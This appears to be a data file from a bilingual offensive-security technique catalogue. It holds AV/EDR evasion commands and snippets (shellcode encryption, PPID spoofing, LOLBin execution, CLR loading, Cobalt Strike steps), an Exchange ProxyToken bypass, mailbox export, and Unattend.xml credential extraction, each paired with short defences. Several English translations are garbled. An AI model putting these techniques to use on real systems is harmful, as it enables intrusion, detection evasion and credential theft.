      vulnerability: { zh: 'Windows允许进程设置DLL加载策略。', en: 'WindowsAllowProcessSetDLLLoadStrategy.' },
      exploitation: { zh: '利用流程：1) 启用BlockDLLs 2) 创建子进程 3) EDR无法注入', en: 'Exploitation workflow: 1) Enable BlockDLLs 2) Create child process 3) EDR cannot inject' },
      mitigation: { zh: '防御措施：1) 使用内核级监控 2) ETW跟踪 3) 早期启动驱动', en: 'Defenses: 1) Use kernel-level monitoring 2) ETW tracing 3) Early-launch anti-malware driver' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'evasion-shellcode-encrypt',
    name: { zh: 'Shellcode加密', en: 'Shellcode Encryption' },
    description: { zh: '加密Shellcode绕过静态检测', en: 'Encrypt Shellcode to Bypass Static Detection' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: { zh: 'Shellcode加密', en: 'Shellcode Encryption' },
    tags: ['evasion', 'shellcode', 'encrypt'],
    prerequisites: ['Shellcode', { zh: '加密工具', en: 'EncryptionTools' }],
    execution: [
      {
        title: { zh: 'AES加密Shellcode', en: 'AESEncryptionShellcode' },
        command: '使用工具加密:\npython shellcode_encoder.py --input shellcode.bin --output encoded.bin --key randomkey\n生成加密的Shellcode和解密代码',
        description: { zh: 'AES加密', en: 'AESEncryption' },
        platform: 'all'
      },
      {
        title: { zh: 'XOR加密', en: 'XOREncryption' },
        command: '简单XOR加密:\nfor i in range(len(shellcode)):\n    encoded[i] = shellcode[i] ^ key[i % len(key)]\n运行时解密执行',
        description: { zh: 'XOR加密', en: 'XOREncryption' },
        platform: 'all',
        syntaxBreakdown: [
          { part: 'XOR', explanation: { zh: '异或加密简单有效', en: 'XOR encryption is simple and effective' } , type: 'keyword' },
          { part: '运行时解密', explanation: { zh: '内存中解密执行', en: 'MemoryMiddleDecryptionExecute' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: 'RC4加密', en: 'RC4Encryption' },
        command: '使用RC4加密Shellcode:\nfrom Crypto.Cipher import ARC4\ncipher = ARC4.new(key)\nencrypted = cipher.encrypt(shellcode)\n运行时使用相同密钥解密',
        description: { zh: 'RC4加密', en: 'RC4Encryption' },
        platform: 'all'
      },
      {
        title: { zh: '多态加密', en: 'Polymorphic Encryption' },
        command: '每次生成不同的解密代码:\n- 随机密钥\n- 随机解密顺序\n- 添加垃圾指令\n- 控制流混淆',
        description: { zh: '多态加密', en: 'Polymorphic Encryption' },
        platform: 'all'
      }
    ],
    tutorial: {
      overview: { zh: 'Shellcode加密可绕过静态特征检测。', en: 'Shellcode encryption can bypass static signature detection.' },
      vulnerability: { zh: 'AV依赖静态特征匹配。', en: 'AV relies on static signature matching.' },
      exploitation: { zh: '利用流程：1) 加密Shellcode 2) 生成解密代码 3) 运行时解密执行', en: 'Exploitationworkflow: 1) EncryptionShellcode 2) GenerateDecryptionCode 3) RunWhenDecryptionExecute' },
      mitigation: { zh: '防御措施：1) 内存扫描 2) 行为分析 3) 沙箱检测', en: 'Defensemeasures: 1) MemoryScan 2) behaviorAnalyze 3) SandboxDetection' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'evasion-process-masq',
    name: { zh: '进程伪装', en: 'Process Masquerading' },
    description: { zh: '伪装进程名称和路径', en: 'Spoof Process Name and Path' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: { zh: '进程伪装', en: 'Process Masquerading' },
    tags: ['evasion', 'process', 'masquerade'],
    prerequisites: [{ zh: 'Windows系统', en: 'WindowsSystem' }],
    execution: [
      {
        title: { zh: 'PPID欺骗', en: 'PPID Spoofing' },
        command: 'Cobalt Strike:\nbeacon> ppid 1234\n设置父进程ID为合法进程\nbeacon> run [command]\n新进程继承合法父进程',
        description: { zh: 'PPID欺骗', en: 'PPID Spoofing' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'ppid', explanation: { zh: '设置父进程ID', en: 'Set Parent Process ID' } , type: 'keyword' },
          { part: '继承关系', explanation: { zh: '伪装进程继承链', en: 'Spoof Process Inheritance Chain' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: '进程参数欺骗', en: 'ProcessArgument Spoofing' },
        command: 'CreateProcess参数:\n- lpApplicationName: 合法程序路径\n- lpCommandLine: 包含恶意命令\n- 显示为合法进程',
        description: { zh: '参数欺骗', en: 'Argument Spoofing' },
        platform: 'windows'
      },
      {
        title: { zh: '进程镂空', en: 'Process Hollowing' },
        command: '1. 创建合法进程(挂起状态)\n2. 写入恶意代码\n3. 恢复线程执行\n进程名显示为合法程序',
        description: { zh: '进程镂空', en: 'Process Hollowing' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: '进程伪装可绕过基于进程名的检测。', en: 'Process MasqueradingCanBypassBased onProcessname Detection.' },
      vulnerability: { zh: 'Windows进程创建机制可被利用。', en: 'WindowsProcessCreateMechanismCan by Exploitation.' },
      exploitation: { zh: '利用流程：1) 选择合法进程 2) 创建伪装进程 3) 执行恶意代码', en: 'Exploitation workflow: 1) Choose a legitimate process 2) Create spoofed process 3) Execute malicious code' },
      mitigation: { zh: '防御措施：1) 检查进程内存 2) 验证代码签名 3) 监控异常行为', en: 'Defensemeasures: 1) CheckProcessMemory 2) VerifyCodeSignature 3) MonitoringExceptionbehavior' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'evasion-ppid-spoof',
    name: { zh: 'PPID欺骗', en: 'PPID Spoofing' },
    description: { zh: '伪造父进程ID', en: 'Forge Parent Process ID' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: { zh: 'PPID欺骗', en: 'PPID Spoofing' },
    tags: ['evasion', 'ppid', 'spoofing'],
    prerequisites: [{ zh: 'Windows系统', en: 'WindowsSystem' }, { zh: '父进程句柄', en: 'Parent Process Handle' }],
    execution: [
      {
        title: { zh: 'PowerShell实现', en: 'PowerShellImplement' },
        command: '$parent = Get-Process -Name explorer\n$pi = New-Object System.Diagnostics.ProcessStartInfo\n$pi.FileName = "cmd.exe"\n$pi.ParentProcessId = $parent.Id\n[System.Diagnostics.Process]::Start($pi)',
        description: { zh: 'PowerShell PPID欺骗', en: 'PowerShell PPID Spoofing' },
        platform: 'windows'
      },
      {
        title: { zh: 'C#实现', en: 'C# implementation' },
        command: '[StructLayout(LayoutKind.Sequential)]\npublic struct STARTUPINFOEX {\n    public STARTUPINFO StartupInfo;\n    public IntPtr lpAttributeList;\n}\n使用PROC_THREAD_ATTRIBUTE_PARENT_PROCESS属性',
        description: { zh: 'C#实现', en: 'C# implementation' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'PROC_THREAD_ATTRIBUTE_PARENT_PROCESS', explanation: { zh: '设置父进程属性', en: 'Set Parent Process Attribute' } , type: 'keyword' },
          { part: 'lpAttributeList', explanation: { zh: '属性列表', en: 'propertycolumntable' } , type: 'keyword' }
        ]
      },
      {
        title: 'Cobalt Strike',
        command: 'beacon> ppid [explorer_pid]\nbeacon> run notepad.exe\n新进程父进程为explorer.exe',
        description: { zh: 'Cobalt Strike实现', en: 'Cobalt StrikeImplement' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'PPID欺骗可伪装进程的父子关系。', en: 'PPID spoofing can disguise a process parent-child relationship.' },
      vulnerability: { zh: 'Windows允许指定父进程。', en: 'Windows allows specifying a parent process.' },
      exploitation: { zh: '利用流程：1) 获取合法进程PID 2) 创建进程时指定父进程 3) 绕过检测', en: 'Exploitation workflow: 1) Obtain a legitimate process PID 2) Specify parent process at creation 3) Bypass detection' },
      mitigation: { zh: '防御措施：1) 检查进程树 2) 监控异常父子关系 3) ETW跟踪', en: 'Defenses: 1) Inspect process tree 2) Monitor anomalous parent-child relationships 3) ETW tracing' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'evasion-dll-sideloading',
    name: { zh: 'DLL侧加载', en: 'DLL Side-Loading' },
    description: { zh: '利用DLL搜索顺序加载恶意DLL', en: 'Exploit DLL Search Order to Load Malicious DLL' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: { zh: 'DLL侧加载', en: 'DLL Side-Loading' },
    tags: ['evasion', 'dll', 'sideloading'],
    prerequisites: [{ zh: 'Windows系统', en: 'WindowsSystem' }, { zh: '可执行文件', en: 'CanExecuteFile' }],
    execution: [
      {
        title: { zh: 'DLL劫持', en: 'DLL Hijacking' },
        command: '1. 找到可执行文件加载的DLL\n2. 将恶意DLL放在搜索路径优先位置\n3. 执行程序时加载恶意DLL',
        description: { zh: 'DLL劫持原理', en: 'DLL HijackingPrinciple' },
        platform: 'windows'
      },
      {
        title: { zh: 'DLL转发', en: 'DLLForward' },
        command: '#pragma comment(linker, "/export:OriginalFunction=original.dll.OriginalFunction")\n导出原始DLL的函数\n同时执行恶意代码',
        description: { zh: 'DLL转发', en: 'DLLForward' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '/export:', explanation: { zh: '导出函数', en: 'ExportFunction' } , type: 'parameter' },
          { part: 'original.dll', explanation: { zh: '转发到原始DLL', en: 'Forward to originalDLL' } , type: 'path' }
        ]
      },
      {
        title: { zh: '常见目标', en: 'commonTarget' },
        command: '常见DLL劫持目标:\n- version.dll\n- dwmapi.dll\n- uxtheme.dll\n- cryptsp.dll\n- winmm.dll',
        description: { zh: '常见目标DLL', en: 'commonTargetDLL' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'DLL侧加载利用Windows DLL搜索顺序。', en: 'DLL side-loading exploits the Windows DLL search order.' },
      vulnerability: { zh: 'Windows DLL搜索顺序可被利用。', en: 'The Windows DLL search order can be exploited.' },
      exploitation: { zh: '利用流程：1) 分析目标程序 2) 创建恶意DLL 3) 放置在搜索路径', en: 'Exploitation workflow: 1) Analyze target program 2) Create malicious DLL 3) Place in search path' },
      mitigation: { zh: '防御措施：1) 使用绝对路径 2) SetDllDirectory 3) 监控DLL加载', en: 'Defenses: 1) Use absolute paths 2) SetDllDirectory 3) Monitor DLL loading' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'evasion-arg-spoofing',
    name: { zh: '参数欺骗', en: 'Argument Spoofing' },
    description: { zh: '欺骗进程参数显示', en: 'SpoofingProcessParameterDisplay' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: { zh: '参数欺骗', en: 'Argument Spoofing' },
    tags: ['evasion', 'argument', 'spoofing'],
    prerequisites: [{ zh: 'Windows系统', en: 'WindowsSystem' }],
    execution: [
      {
        title: { zh: '命令行欺骗', en: 'CommandlineSpoofing' },
        command: 'CreateProcess参数:\nlpApplicationName = "C:\\Windows\\System32\\cmd.exe"\nlpCommandLine = "C:\\Windows\\System32\\cmd.exe /c whoami"\n实际执行恶意命令',
        description: { zh: '命令行欺骗', en: 'CommandlineSpoofing' },
        platform: 'windows'
      },
      {
        title: { zh: '环境变量欺骗', en: 'Environment VariableSpoofing' },
        command: '使用环境变量隐藏参数:\nset EVIL=malicious_command\ncmd /c %EVIL%\n进程列表不显示实际命令',
        description: { zh: '环境变量欺骗', en: 'Environment VariableSpoofing' },
        platform: 'windows'
      },
      {
        title: { zh: 'PEB修改', en: 'PEBModify' },
        command: '修改PEB中的命令行:\n1. 创建进程\n2. 修改PEB中的CommandLine缓冲区\n3. 进程管理器显示假参数',
        description: { zh: 'PEB修改', en: 'PEBModify' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'PEB', explanation: { zh: '进程环境块', en: 'Process Environment Block (PEB)' } , type: 'keyword' },
          { part: 'CommandLine', explanation: { zh: '命令行参数存储位置', en: 'Command-Line Argument Storage Location' } , type: 'keyword' }
        ]
      }
    ],
    tutorial: {
      overview: { zh: '参数欺骗可隐藏实际执行的命令。', en: 'Argument spoofing can hide the actual executed command.' },
      vulnerability: { zh: 'Windows命令行显示可被修改。', en: 'WindowsCommandlineDisplayCan by Modify.' },
      exploitation: { zh: '利用流程：1) 创建进程 2) 修改显示参数 3) 隐藏恶意命令', en: 'Exploitationworkflow: 1) CreateProcess 2) ModifyDisplayParameter 3) HiddenMaliciousCommand' },
      mitigation: { zh: '防御措施：1) 内存扫描 2) ETW跟踪 3) 行为分析', en: 'Defenses: 1) Memory scanning 2) ETW tracing 3) Behavioral analysis' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'evasion-signed-binary',
    name: { zh: '签名二进制利用', en: 'Signed BinaryExploitation' },
    description: { zh: '利用微软签名二进制执行代码', en: 'Exploit Microsoft-Signed Binaries to Execute Code' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: { zh: '签名二进制', en: 'Signed Binary' },
    tags: ['evasion', 'signed', 'lolbin'],
    prerequisites: [{ zh: 'Windows系统', en: 'WindowsSystem' }],
    execution: [
      {
        title: 'MSBuild',
        command: 'msbuild.exe malicious.csproj\n执行嵌入的C#代码\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe',
        description: { zh: 'MSBuild执行', en: 'MSBuildExecute' },
        platform: 'windows'
      },
      {
        title: 'InstallUtil',
        command: 'InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll\n执行.NET程序集\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe',
        description: { zh: 'InstallUtil执行', en: 'InstallUtilExecute' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '/U', explanation: { zh: '卸载模式执行代码', en: 'UnloadModeExecuteCode' } , type: 'parameter' },
          { part: 'malicious.dll', explanation: { zh: '恶意.NET程序集', en: 'Malicious .NET Assembly' } , type: 'path' }
        ]
      },
      {
        title: 'Regsvcs/Regasm',
        command: 'regsvcs.exe malicious.dll\nregasm.exe malicious.dll\n执行.NET程序集',
        description: 'Regsvcs/Regasm',
        platform: 'windows'
      },
      {
        title: 'Rundll32',
        command: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"\nrundll32.exe shell32.dll,Control_RunDLL malicious.cpl',
        description: { zh: 'Rundll32执行', en: 'Rundll32Execute' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: '签名二进制是微软签名的合法程序，可被滥用执行代码。', en: 'Signed binaries are legitimate Microsoft-signed programs that can be abused to execute code.' },
      vulnerability: { zh: '微软签名程序有特殊权限。', en: 'Microsoft-signed programs have special privileges.' },
      exploitation: { zh: '利用流程：1) 选择合适工具 2) 准备payload 3) 使用签名程序执行', en: 'Exploitation workflow: 1) Choose a suitable tool 2) Prepare payload 3) Execute with signed binary' },
      mitigation: { zh: '防御措施：1) 监控LOLBAS使用 2) 应用程序白名单 3) 行为分析', en: 'Defensemeasures: 1) MonitoringLOLBASUse 2) ApplicationWhitelist 3) behaviorAnalyze' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'evasion-clr-injection',
    name: { zh: 'CLR注入', en: 'CLR Injection' },
    description: { zh: 'CLR内存注入技术', en: 'CLRMemoryInjectionTechnique' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: { zh: 'CLR注入', en: 'CLR Injection' },
    tags: ['evasion', 'clr', 'injection'],
    prerequisites: [{ zh: 'Windows系统', en: 'WindowsSystem' }, { zh: '.NET环境', en: '.NETEnvironment' }],
    execution: [
      {
        title: { zh: 'CLR内存加载', en: 'CLRMemory Load' },
        command: '使用CLR接口加载.NET程序集:\n1. 获取CLR运行时\n2. 创建AppDomain\n3. 加载程序集\n4. 执行入口点',
        description: { zh: 'CLR加载原理', en: 'CLRLoadPrinciple' },
        platform: 'windows'
      },
      {
        title: { zh: 'C#实现', en: 'C# implementation' },
        command: 'var clr = new ClrModule();\nclr.LoadAssembly(File.ReadAllBytes("malicious.exe"));\nclr.Execute("Main");\n从内存执行.NET程序',
        description: { zh: 'C# CLR加载', en: 'C# CLRLoad' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'LoadAssembly', explanation: { zh: '从字节数组加载', en: 'from byteNumberGroupsLoad' } , type: 'keyword' },
          { part: 'Execute', explanation: { zh: '执行入口点', en: 'Execution Entry Point' } , type: 'keyword' }
        ]
      },
      {
        title: 'Cobalt Strike',
        command: 'beacon> execute-assembly /path/to/tool.exe args\n从内存执行.NET程序集\n不落地执行',
        description: { zh: 'Cobalt Strike实现', en: 'Cobalt StrikeImplement' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'CLR注入可从内存执行.NET程序集。', en: 'CLR injection can execute .NET assemblies from memory.' },
      vulnerability: { zh: '.NET CLR允许动态加载程序集。', en: 'The .NET CLR allows dynamic loading of assemblies.' },
      exploitation: { zh: '利用流程：1) 获取CLR接口 2) 加载程序集 3) 执行代码', en: 'Exploitation workflow: 1) Obtain CLR interface 2) Load assembly 3) Execute code' },
      mitigation: { zh: '防御措施：1) AMSI监控 2) 内存扫描 3) ETW跟踪', en: 'Defenses: 1) AMSI monitoring 2) Memory scanning 3) ETW tracing' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'exchange-proxytoken',
    name: { zh: 'ProxyToken攻击', en: 'ProxyToken Attack' },
    description: { zh: '利用Exchange ProxyToken绕过认证', en: 'ExploitationExchange ProxyToken BypassAuthentication' },
    category: { zh: 'Exchange攻击', en: 'Exchange Attacks' },
    subCategory: 'ProxyToken',
    tags: ['exchange', 'proxytoken', 'bypass'],
    prerequisites: [{ zh: 'Exchange服务器', en: 'ExchangeServer' }, { zh: '存在漏洞', en: 'hasVulnerability' }],
    execution: [
      {
        title: { zh: '检测漏洞', en: 'DetectionVulnerability' },
        command: '使用ProxyToken工具:\npython proxytoken.py -u https://exchange.com -e user@domain.com\n检测是否存在漏洞',
        description: { zh: '检测漏洞', en: 'DetectionVulnerability' },
        platform: 'linux'
      },
      {
        title: { zh: '利用漏洞', en: 'ExploitationVulnerability' },
        command: 'python proxytoken.py -u https://exchange.com -e user@domain.com -a\n获取用户邮箱访问权限',
        description: { zh: '获取邮箱访问', en: 'ObtainMailbox Access' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'ProxyToken', explanation: { zh: '利用前端代理认证绕过', en: 'ExploitationFrontendProxyAuthentication Bypass' } , type: 'keyword' },
          { part: 'EWS接口', explanation: { zh: '通过EWS访问邮箱', en: 'Access Mailbox via EWS' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: '访问邮箱', en: 'Access Mailbox' },
        command: 'curl -k https://exchange.com/ews/Exchange.asmx -H "X-ClientApplication: Test"\n绕过认证访问EWS',
        description: { zh: '访问EWS接口', en: 'AccessEWSInterface' },
        platform: 'all'
      }
    ],
    tutorial: {
      overview: { zh: 'ProxyToken利用Exchange前端代理认证缺陷。', en: 'ProxyTokenExploitationExchangeFrontendProxyAuthentication Flaws.' },
      vulnerability: { zh: 'Exchange前端代理未正确验证认证。', en: 'The Exchange front-end proxy does not properly verify authentication.' },
      exploitation: { zh: '利用流程：1) 检测漏洞 2) 构造请求 3) 绕过认证访问邮箱', en: 'Exploitation workflow: 1) Detect vulnerability 2) Craft request 3) Bypass authentication to access mailbox' },
      mitigation: { zh: '防御措施：1) 安装补丁 2) 加强认证验证 3) 监控异常请求', en: 'Defenses: 1) Install patches 2) Strengthen authentication verification 3) Monitor anomalous requests' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'exchange-mailbox-access',
    name: { zh: 'Exchange邮箱访问', en: 'Exchange Mailbox Access' },
    description: { zh: '通过各种方式访问Exchange邮箱', en: 'Access Exchange Mailbox via Various Methods' },
    category: { zh: 'Exchange攻击', en: 'Exchange Attacks' },
    subCategory: { zh: '邮箱访问', en: 'Mailbox Access' },
    tags: ['exchange', 'mailbox', 'access'],
    prerequisites: [{ zh: 'Exchange凭证或漏洞', en: 'ExchangeCredentials or Vulnerability' }],
    execution: [
      {
        title: { zh: 'OWA访问', en: 'OWAAccess' },
        command: 'https://exchange.com/owa\n使用凭证登录OWA\n查看邮件、日历等',
        description: { zh: 'OWA Web访问', en: 'OWA WebAccess' },
        platform: 'all'
      },
      {
        title: { zh: 'EWS访问', en: 'EWSAccess' },
        command: '使用Impacket:\npython exchanger.py domain/user:password@exchange.com\n或使用EWSTools',
        description: { zh: 'EWS API访问', en: 'EWS APIAccess' },
        platform: 'linux'
      },
      {
        title: 'Outlook MAPI',
        command: '配置Outlook连接Exchange\n使用MAPI协议访问邮箱\n支持邮件、日历、联系人',
        description: { zh: 'Outlook客户端', en: 'OutlookClient' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'OWA', explanation: 'Outlook Web App' , type: 'keyword' },
          { part: 'EWS', explanation: 'Exchange Web Services' , type: 'keyword' },
          { part: 'MAPI', explanation: 'Messaging API' , type: 'keyword' }
        ]
      },
      {
        title: { zh: '导出邮箱', en: 'Export Mailbox' },
        command: 'PowerShell:\nNew-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\\\server\\share\\user.pst"\n导出邮箱为PST文件',
        description: { zh: '导出邮箱', en: 'Export Mailbox' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'Exchange邮箱可通过多种协议访问。', en: 'Exchange mailboxes can be accessed through multiple protocols.' },
      vulnerability: { zh: '获取凭证后可完全控制邮箱。', en: 'After obtaining credentials, the mailbox can be fully controlled.' },
      exploitation: { zh: '利用流程：1) 获取凭证 2) 选择访问方式 3) 访问邮箱数据', en: 'Exploitation workflow: 1) Obtain credentials 2) Choose access method 3) Access mailbox data' },
      mitigation: { zh: '防御措施：1) MFA认证 2) 监控异常登录 3) 审计邮箱访问', en: 'Defensemeasures: 1) MFAAuthentication 2) MonitoringExceptionLogin 3) AuditMailbox Access' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'sharepoint-file-access',
    name: { zh: 'SharePoint文件访问', en: 'SharePoint File Access' },
    description: { zh: '访问SharePoint文档库中的文件', en: 'AccessSharePointDocumentationdatabaseMiddle File' },
    category: { zh: 'SharePoint攻击', en: 'SharePoint Attacks' },
    subCategory: { zh: '文件访问', en: 'File Access' },
    tags: ['sharepoint', 'file', 'access'],
    prerequisites: [{ zh: 'SharePoint凭证或漏洞', en: 'SharePointCredentials or Vulnerability' }],
    execution: [
      {
        title: { zh: 'Web界面访问', en: 'Web Interface Access' },
        command: 'https://sharepoint.com/sites/site_name/Shared Documents\n通过浏览器访问文档库\n下载敏感文件',
        description: { zh: 'Web界面访问', en: 'Web Interface Access' },
        platform: 'all'
      },
      {
        title: { zh: 'REST API访问', en: 'REST APIAccess' },
        command: 'curl -k -u user:password "https://sharepoint.com/_api/web/lists/getbytitle(\'Documents\')/items"\n获取文档列表\n下载文件内容',
        description: { zh: 'REST API访问', en: 'REST APIAccess' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '_api/web/lists', explanation: { zh: 'REST API端点', en: 'REST APIEndpoint' } , type: 'keyword' },
          { part: 'getbytitle', explanation: { zh: '按名称获取列表', en: 'Get List by Name' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: 'CSOM访问', en: 'CSOMAccess' },
        command: '使用SharePoint客户端对象模型:\nClientContext context = new ClientContext("https://sharepoint.com");\ncontext.Credentials = new SharePointOnlineCredentials(user, password);\nList list = context.Web.Lists.GetByTitle("Documents");',
        description: { zh: 'CSOM访问', en: 'CSOMAccess' },
        platform: 'windows'
      },
      {
        title: { zh: 'OneDrive同步', en: 'OneDriveSamestep' },
        command: '使用OneDrive客户端同步SharePoint文档库\n本地访问所有文件\n离线查看敏感数据',
        description: { zh: 'OneDrive同步', en: 'OneDriveSamestep' },
        platform: 'all'
      }
    ],
    tutorial: {
      overview: { zh: 'SharePoint文件可通过多种方式访问。', en: 'SharePointFileCanthroughMultipleMethodAccess.' },
      vulnerability: { zh: '获取凭证后可访问所有授权文档。', en: 'ObtainCredentialsAfterCanAccessallAuthorizationDocumentation.' },
      exploitation: { zh: '利用流程：1) 获取凭证 2) 访问文档库 3) 下载敏感文件', en: 'Exploitationworkflow: 1) ObtainCredentials 2) AccessDocumentationdatabase 3) DownloadSensitive Files' },
      mitigation: { zh: '防御措施：1) 权限最小化 2) 监控文件访问 3) 数据分类保护', en: 'Defenses: 1) Least privilege 2) Monitor file access 3) Data classification and protection' },
      difficulty: 'beginner'
    }
  },
  // ==================== 凭证收集 - 无人值守安装凭证 ====================
  {
    id: 'unattended-creds',
    name: { zh: '无人值守安装凭证提取', en: 'Unattended Installation Credential Extraction' },
    description: { zh: '从Windows无人值守安装文件(Unattend.xml/Sysprep)中提取明文或Base64编码的管理员凭证', en: 'Extract plaintext or Base64-encoded admin credentials from Windows unattended installation files (Unattend.xml/Sysprep)' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: { zh: '文件凭证', en: 'File Credentials' },
    tags: ['credentials', 'unattend', 'sysprep', 'privilege-escalation', 'windows'],
    prerequisites: [{ zh: '本地文件系统读取权限', en: 'LocalFileSystemReadPermission' }, { zh: '目标使用过无人值守部署', en: 'Target has used unattended deployment' }],
    execution: [
      {
        title: { zh: '搜索无人值守安装文件', en: 'Search for Unattended Installation Files' },
        command: 'dir /s /b C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\unattended.xml C:\\Windows\\Panther\\Autounattend.xml C:\\Windows\\System32\\Sysprep\\sysprep.xml C:\\Windows\\System32\\Sysprep\\unattend.xml 2>nul',
        description: { zh: '在默认路径搜索Unattend/Sysprep配置文件，这些文件在Windows自动部署后可能残留在系统中', en: 'Search default paths for Unattend/Sysprep config files that may remain on the system after Windows automated deployment' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'dir /s /b', explanation: { zh: '递归搜索并仅输出文件完整路径', en: 'recursiveSearch and OnlyOutputFilecompletePath' }, type: 'command' },
          { part: 'C:\\\\Windows\\\\Panther\\\\', explanation: { zh: 'Windows安装日志和配置默认存放目录', en: 'Default directory for Windows installation logs and configuration' }, type: 'value' },
          { part: 'C:\\\\Windows\\\\System32\\\\Sysprep\\\\', explanation: { zh: 'Sysprep系统准备工具配置目录', en: 'Sysprep system preparation tool configuration directory' }, type: 'value' },
          { part: '2>nul', explanation: { zh: '抑制文件未找到的错误输出', en: 'Suppress file-not-found error output' }, type: 'operator' }
        ]
      },
      {
        title: { zh: '全盘搜索Unattend文件', en: 'Full Disk Search for Unattend Files' },
        command: '# CMD方式\ndir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml 2>nul\n\n# PowerShell方式\nGet-ChildItem -Path C:\\ -Recurse -Include "*unattend*","*sysprep*","*autounattend*" -ErrorAction SilentlyContinue | Select-Object FullName',
        description: { zh: '当默认路径找不到时，全盘递归搜索所有可能的无人值守文件', en: 'When default paths yield nothing, recursively search all drives for possible unattended files' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'Get-ChildItem -Recurse', explanation: { zh: 'PowerShell递归搜索', en: 'PowerShellrecursiveSearch' }, type: 'command' },
          { part: '-Include', explanation: { zh: '按通配符模式匹配文件名', en: 'Match filenames by wildcard pattern' }, type: 'parameter' },
          { part: '-ErrorAction SilentlyContinue', explanation: { zh: '忽略权限不足等错误', en: 'Ignore insufficient-permission errors' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '提取明文密码', en: 'ExtractplaintextPassword' },
        command: '# 查看文件内容\ntype C:\\Windows\\Panther\\Unattend.xml\n\n# 关键字段搜索\nfindstr /i /c:"Password" /c:"AutoLogon" /c:"AdminPassword" C:\\Windows\\Panther\\Unattend.xml\n\n# PowerShell提取\n[xml]$xml = Get-Content C:\\Windows\\Panther\\Unattend.xml\n$xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }',
        description: { zh: '从Unattend.xml中提取密码字段，密码可能以明文或Base64编码形式存储在<Password>/<AdminPassword>/<AutoLogon>节点中', en: 'Extract password fields from Unattend.xml; passwords may be stored as plaintext or Base64 in <Password>/<AdminPassword>/<AutoLogon> nodes' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'findstr /i /c:', explanation: { zh: '不区分大小写搜索指定字符串', en: 'Case-insensitive search for specified strings' }, type: 'command' },
          { part: 'Password', explanation: { zh: '密码字段关键字', en: 'PasswordfieldCriticalCharacter' }, type: 'value' },
          { part: 'AdminPassword', explanation: { zh: '管理员密码字段', en: 'ManagementMemberPasswordfield' }, type: 'value' },
          { part: 'AutoLogon', explanation: { zh: '自动登录配置(含明文密码)', en: 'Auto-logon configuration (containing plaintext passwords)' }, type: 'value' },
          { part: '[xml]$xml', explanation: { zh: '将XML文件解析为PowerShell XML对象', en: 'will XMLFileParse is PowerShell XML for Object' }, type: 'command' }
        ]
      },
      {
        title: { zh: '解码Base64密码', en: 'DecodingBase64Password' },
        command: '# PowerShell解码Base64\n$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"  # 从XML提取的编码值\n[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))\n\n# 或者使用certutil\necho QQBkAG0AaQBuAEAAMQAyADMA > C:\\temp\\encoded.txt\ncertutil -decode C:\\temp\\encoded.txt C:\\temp\\decoded.txt\ntype C:\\temp\\decoded.txt',
        description: { zh: 'Unattend.xml中的密码如果以Base64编码存储，需要解码。Windows使用UTF-16LE编码，因此必须用Unicode解码而非ASCII', en: 'Passwords in Unattend.xml stored as Base64 need decoding. Windows uses UTF-16LE encoding, so Unicode decoding (not ASCII) is required' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '[System.Text.Encoding]::Unicode', explanation: { zh: 'UTF-16LE解码(Windows默认)', en: 'UTF-16LEDecoding(WindowsDefault)' }, type: 'command' },
          { part: 'FromBase64String', explanation: { zh: 'Base64解码方法', en: 'Base64DecodingMethod' }, type: 'command' },
          { part: 'certutil -decode', explanation: { zh: '使用系统自带工具解码Base64', en: 'Decode Base64 Using Built-in System Tools' }, type: 'command' }
        ]
      },
      {
